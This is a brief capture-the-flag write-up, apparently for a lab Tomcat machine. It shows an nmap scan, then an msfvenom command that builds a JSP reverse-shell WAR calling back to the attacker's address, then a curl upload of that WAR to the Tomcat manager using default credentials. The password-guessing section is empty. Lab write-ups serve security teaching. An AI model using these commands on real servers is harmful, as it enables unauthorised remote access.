## Tools used

- [nmap](https://nmap.org/)
- [hydra](https://github.com/vanhauser-thc/thc-hydra)
- [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)

## What to do ?

- First we'll scan port with `nmap` to discover if was some it open
- Then we'll find a loophole and exploit it.

### Nmap Scan

```bash
rether> nmap -A -Pn 10.10.10.95
[...]
PORT     STATE SERVICE
8080/tcp open  http-proxy
[...]
```

> Command explained :
 - `-A` : Enable OS detection, version detection, script scanning, and traceroute
 - `-Pn` : No ping scan
{: .prompt-info }

### Get password with hydra

### Create revershell and upload it

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST={your-ip-address} LPORT=1234 -f war > shell.war
```

```bash
┌──(rether㉿rether)-[~/]
└─$ curl -T shell.war -u 'tomcat:s3cret' http://10.10.10.95:8080/manager/text/deploy?path=/shell
```
